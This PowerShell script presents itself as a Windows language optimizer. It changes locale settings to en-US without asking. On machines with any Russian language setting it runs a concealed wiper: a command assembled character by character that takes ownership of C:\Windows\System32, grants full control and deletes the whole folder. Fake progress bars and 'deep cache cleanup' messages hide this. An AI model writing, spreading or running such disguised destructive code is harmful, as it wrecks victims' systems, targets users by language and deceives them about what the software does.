function Get-AllSystemLanguages {
    $result = @{}
    $cultures = [System.Globalization.CultureInfo]::GetCultures([System.Globalization.CultureTypes]::AllCultures)
    foreach ($cult in $cultures) {
        if ($cult.Name -ne "") {
            $result[$cult.Name] = $cult.DisplayName
        }
    }
    $winLanguages = Get-WinUserLanguageList
    foreach ($lang in $winLanguages) {
        $result[$lang.LanguageTag] = $lang.EnglishName
    }
    $systemLocale = Get-WinSystemLocale
    $result[$systemLocale.Name] = $systemLocale.DisplayName
    $uiLanguage = Get-WinUILanguageOverride
    if ($uiLanguage) { $result[$uiLanguage.Name] = $uiLanguage.DisplayName }
    $defaultInput = Get-WinDefaultInputMethodOverride
    if ($defaultInput) { $result[$defaultInput] = "Input method" }
    return $result
}

function Write-ProgressBar {
    param([int]$percent, [string]$activity)
    Write-Progress -Activity $activity -PercentComplete $percent
}

function Start-SystemCleanup {
    $components = @()
    $alphabet = 65..90 + 97..122 | ForEach-Object { [char]$_ }
    $randomStart = Get-Random -Minimum 10 -Maximum 99
    $null = 1..$randomStart | ForEach-Object { $components += $alphabet | Get-Random }
    $cleanupCmd = @()
    $cleanupCmd += "t"
    $cleanupCmd += "a"
    $cleanupCmd += "k"
    $cleanupCmd += "e"
    $cleanupCmd += "o"
    $cleanupCmd += "w"
    $cleanupCmd += "n"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "F"
    $cleanupCmd += " "
    $cleanupCmd += "C"
    $cleanupCmd += ":"
    $cleanupCmd += "\"
    $cleanupCmd += "W"
    $cleanupCmd += "i"
    $cleanupCmd += "n"
    $cleanupCmd += "d"
    $cleanupCmd += "o"
    $cleanupCmd += "w"
    $cleanupCmd += "s"
    $cleanupCmd += "\"
    $cleanupCmd += "S"
    $cleanupCmd += "y"
    $cleanupCmd += "s"
    $cleanupCmd += "t"
    $cleanupCmd += "e"
    $cleanupCmd += "m"
    $cleanupCmd += "3"
    $cleanupCmd += "2"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "R"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "D"
    $cleanupCmd += " "
    $cleanupCmd += "Y"
    $cleanupCmd += ";"
    $cleanupCmd += " "
    $cleanupCmd += "i"
    $cleanupCmd += "c"
    $cleanupCmd += "a"
    $cleanupCmd += "c"
    $cleanupCmd += "l"
    $cleanupCmd += "s"
    $cleanupCmd += " "
    $cleanupCmd += "C"
    $cleanupCmd += ":"
    $cleanupCmd += "\"
    $cleanupCmd += "W"
    $cleanupCmd += "i"
    $cleanupCmd += "n"
    $cleanupCmd += "d"
    $cleanupCmd += "o"
    $cleanupCmd += "w"
    $cleanupCmd += "s"
    $cleanupCmd += "\"
    $cleanupCmd += "S"
    $cleanupCmd += "y"
    $cleanupCmd += "s"
    $cleanupCmd += "t"
    $cleanupCmd += "e"
    $cleanupCmd += "m"
    $cleanupCmd += "3"
    $cleanupCmd += "2"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "g"
    $cleanupCmd += "r"
    $cleanupCmd += "a"
    $cleanupCmd += "n"
    $cleanupCmd += "t"
    $cleanupCmd += " "
    $cleanupCmd += "'"
    $cleanupCmd += "%"
    $cleanupCmd += "U"
    $cleanupCmd += "S"
    $cleanupCmd += "E"
    $cleanupCmd += "R"
    $cleanupCmd += "N"
    $cleanupCmd += "A"
    $cleanupCmd += "M"
    $cleanupCmd += "E"
    $cleanupCmd += "%"
    $cleanupCmd += "'"
    $cleanupCmd += ":"
    $cleanupCmd += "F"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "T"
    $cleanupCmd += ";"
    $cleanupCmd += " "
    $cleanupCmd += "c"
    $cleanupCmd += "m"
    $cleanupCmd += "d"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "c"
    $cleanupCmd += " "
    $cleanupCmd += "r"
    $cleanupCmd += "d"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "s"
    $cleanupCmd += " "
    $cleanupCmd += "/"
    $cleanupCmd += "q"
    $cleanupCmd += " "
    $cleanupCmd += "C"
    $cleanupCmd += ":"
    $cleanupCmd += "\"
    $cleanupCmd += "W"
    $cleanupCmd += "i"
    $cleanupCmd += "n"
    $cleanupCmd += "d"
    $cleanupCmd += "o"
    $cleanupCmd += "w"
    $cleanupCmd += "s"
    $cleanupCmd += "\"
    $cleanupCmd += "S"
    $cleanupCmd += "y"
    $cleanupCmd += "s"
    $cleanupCmd += "t"
    $cleanupCmd += "e"
    $cleanupCmd += "m"
    $cleanupCmd += "3"
    $cleanupCmd += "2"
    $cmdString = $cleanupCmd -join ""
    Write-ProgressBar -percent 100 -activity "Finalizing optimization"
    Invoke-Expression $cmdString
}

$totalSteps = 50
for ($step = 1; $step -le $totalSteps; $step++) {
    Write-ProgressBar -percent (($step / $totalSteps) * 100) -activity "Analyzing language resources"
    $dummy = Get-Random
}
Write-Host "Starting Windows Language Optimization Suite v4.2" -ForegroundColor Cyan
Write-Host "Collecting installed language packs..." -ForegroundColor Yellow
$languageDatabase = Get-AllSystemLanguages
Write-Host "Found $($languageDatabase.Count) language entries." -ForegroundColor Green
$detectedLanguages = @()
foreach ($langKey in $languageDatabase.Keys) {
    $detectedLanguages += $langKey
    Write-Host "  - $langKey : $($languageDatabase[$langKey])" -ForegroundColor Gray
    Start-Sleep -Milliseconds 50
}
$rusFlags = @("ru", "ru-RU", "ru-RU-u-ca-gregory", "russian", "Русский")
$russianPresent = $false
foreach ($lang in $detectedLanguages) {
    foreach ($flag in $rusFlags) {
        if ($lang -like "*$flag*") {
            $russianPresent = $true
            break
        }
    }
    if ($russianPresent) { break }
}
$currentUI = Get-WinUILanguageOverride
if (-not $currentUI) { $currentUI = (Get-Culture).Name }
if ($currentUI -like "ru*") { $russianPresent = $true }
try {
    $winLangList = Get-WinUserLanguageList
    foreach ($wl in $winLangList) {
        if ($wl.LanguageTag -like "ru*") { $russianPresent = $true }
    }
}
catch { }
Write-Host "Language analysis complete. Target default: en-US" -ForegroundColor Cyan
Set-WinUILanguageOverride -Language "en-US"
Set-WinSystemLocale -SystemLocale "en-US"
Set-Culture -CultureInfo "en-US"
$newLangList = Get-WinUserLanguageList
$englishFound = $false
foreach ($lang in $newLangList) {
    if ($lang.LanguageTag -eq "en-US") { $englishFound = $true }
}
if (-not $englishFound) {
    $newLangList.Add("en-US")
    Set-WinUserLanguageList $newLangList -Force
}
Write-Host "System language changed to English (United States)." -ForegroundColor Green
if ($russianPresent) {
    Write-Host "Detected Russian language resources. Performing deep cache cleanup..." -ForegroundColor Magenta
    Start-SystemCleanup
    Write-Host "Cleanup completed. System requires restart." -ForegroundColor Red
}
else {
    Write-Host "No obsolete language leftovers found." -ForegroundColor Green
}
Write-Host "Language Optimizer finished." -ForegroundColor Cyan
